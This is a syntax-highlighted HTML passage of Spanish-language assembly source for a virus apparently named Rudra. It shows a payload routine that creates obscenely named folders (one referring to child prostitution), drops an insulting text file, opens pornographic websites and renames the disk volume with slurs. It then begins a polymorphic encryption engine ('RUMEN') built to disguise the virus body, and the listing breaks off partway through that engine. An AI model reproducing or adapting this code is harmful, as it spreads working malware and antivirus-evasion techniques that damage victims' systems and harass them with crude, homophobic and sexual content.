  </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">@CrearDirectorios</span><span class="sc0">
  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1d</span><span class="sc0">
  </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">@PonerSitios</span><span class="sc0">
  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2d</span><span class="sc0">
  </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">@CambiarVolumen</span><span class="sc0">

  </span><span class="sc5">@Retorna_Paylo</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">POPAD</span><span class="sc0">
  </span><span class="sc6">RET</span><span class="sc0">

  </span><span class="sc5">Directorios</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"\El Guevo"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"\Fotos Porno"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"\Sodomia y Otras Perversiones"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"\Prostitucion de Niคas"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"\Ventas de Cocaina"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"\Planes de Golpe de Estado"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"\Facturas de Autos Robados"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"\Se vende este computador"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"\Rudra"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

  </span><span class="sc5">Idioteces</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Te meto hasta el fondo!"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Toma guevo por curioso"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Vamos a jugar keto: vos te agachas, yo te lo meto."</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"O que tal piragua?"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Y Rinoceronte?"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Alarma activada! Alarma activada! Llamando a "</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"la DISIP por modem! acusando por violacion de "</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"los derechos humanos!"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"La DHEA ha sido contactada... usted esta rodeado."</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Andate pa' la puta mierda adeco corrupto sucio culiao."</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Mardito sea el que se llevo mi Fairlander!!!"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Gracias por activar esta opcion. En este "</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"momento estamos colocando un clasificado en "</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"El Universal para la venta de su computador."</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Que? yo? un virus? estas loco? COMO TE ATREVES!"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

  </span><span class="sc5">Sitios_Web</span><span class="sc0">            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"http://www.sexycaracas.com"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"http://www.pornocaracas.com"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"http://www.venezuelaerotica.com"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"http://www.sexoloco.com"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"file://C:\con\con"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

  </span><span class="sc5">Volumenz</span><span class="sc0">              </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Mierda"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Sodomia"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Mis Nalgas"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Gay Tu Papa"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Putas"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Rudra"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

  </span><span class="sc5">@Puyalo</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Puyado</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Puyado</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
    </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

  </span><span class="sc5">@CrearDirectorios</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Puyalo</span><span class="sc0">
    </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Directorios</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
    </span><span class="sc5">@CD1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">SCASB</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">@CD1</span><span class="sc0">
    </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">@CD1</span><span class="sc0">

    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
    </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">CreateDirectoryA</span><span class="sc0">

    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
    </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">

    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@CD2</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"Leeme Por Favor.txt"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc5">@CD2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">_lcreat</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">

    </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Idioteces</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">   
    </span><span class="sc5">@CD3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">SCASB</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">@CD3</span><span class="sc0">
    </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">@CD3</span><span class="sc0">
      
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
    </span><span class="sc5">@CD4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
    </span><span class="sc6">SCASB</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">@CD4</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">

    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">_lwrite</span><span class="sc0">

    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@Retorna_Paylo</span><span class="sc0">

  </span><span class="sc5">@PonerSitios</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@PS1</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"SHELL32.DLL"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc5">@PS1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">@Retorna_Paylo</span><span class="sc0">

    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@PS2</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"ShellExecuteA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc5">@PS2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">@Retorna_Paylo</span><span class="sc0">

    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc2">05d</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Puyalo</span><span class="sc0">

    </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Sitios_Web</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
    </span><span class="sc5">@PS3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">SCASB</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">@PS3</span><span class="sc0">
    </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">@PS3</span><span class="sc0">

    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">SW_SHOW</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@Retorna_Paylo</span><span class="sc0">

  </span><span class="sc5">@CambiarVolumen</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc2">06d</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Puyalo</span><span class="sc0">

    </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Volumenz</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc5">@CV1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">SCASB</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">@CV1</span><span class="sc0">

    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
    </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">SetVolumeLabelA</span><span class="sc0">

    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@Retorna_Paylo</span><span class="sc0">

  </span><span class="sc5">Puyado</span><span class="sc0">                </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  
  </span><span class="sc5">Paylo</span><span class="sc0">                 </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ</span><span class="sc0">

  </span><span class="sc1">; RUMEN: Rudra Mutation Engine.</span><span class="sc0">
  </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc1">; EDI -&gt; Donde guardar el virus encriptado.</span><span class="sc0">
  </span><span class="sc1">; ESI -&gt; Codigo a encriptar.</span><span class="sc0">
  </span><span class="sc1">; ECX -&gt; Tamaคo del codigo a encriptar.</span><span class="sc0">

  </span><span class="sc5">RUMEN</span><span class="sc0">                 </span><span class="sc9">PROC</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Guarda_DC</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o_EC</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">

  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Fecha</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">GetSystemTime</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Ultimo_Dia</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">WO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Fecha.wDay</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
  </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">@Semillas_Listas</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Fecha.wDay</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">WO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Ultimo_Dia</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
  
  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">GetTickCount</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Aleat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                          </span><span class="sc1">; inicializar la semilla</span><span class="sc0">

  </span><span class="sc6">RDTSC</span><span class="sc0">
  </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">Random</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Llave</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

  </span><span class="sc6">RDTSC</span><span class="sc0">
  </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">Random</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">WO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Llave_II</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

  </span><span class="sc5">@Semillas_Listas</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Segunda_Capa</span><span class="sc0">
  
  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Colocar_Opcodes</span><span class="sc0">

  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@I0</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOVSD</span><span class="sc0">
  </span><span class="sc6">MOVSB</span><span class="sc0">

  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Colocar_Opcodes</span><span class="sc0">

  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@I1</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOVSB</span><span class="sc0">

  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Colocar_Opcodes</span><span class="sc0">

  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@I2</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOVSW</span><span class="sc0">
  </span><span class="sc6">MOVSD</span><span class="sc0">

  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Colocar_Opcodes</span><span class="sc0">

  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@I3</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOVSD</span><span class="sc0">
  </span><span class="sc6">MOVSW</span><span class="sc0">

  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Colocar_Opcodes</span><span class="sc0">

  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@I4</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOVSD</span><span class="sc0">
  </span><span class="sc6">MOVSB</span><span class="sc0">

  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Colocar_Opcodes</span><span class="sc0">

  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@I5</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOVSW</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Llave</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">STOSD</span><span class="sc0">

  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Colocar_Opcodes</span><span class="sc0">

  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@I6</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOVSW</span><span class="sc0">
  </span><span class="sc6">MOVSB</span><span class="sc0">

  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Colocar_Opcodes</span><span class="sc0">

  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@I7</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOVSW</span><span class="sc0">

  </span><span class="sc1">; ya esta hecho el desencriptor... ahora...</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Memoria</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o_EC</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000004h</span><span class="sc0">
  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
  </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
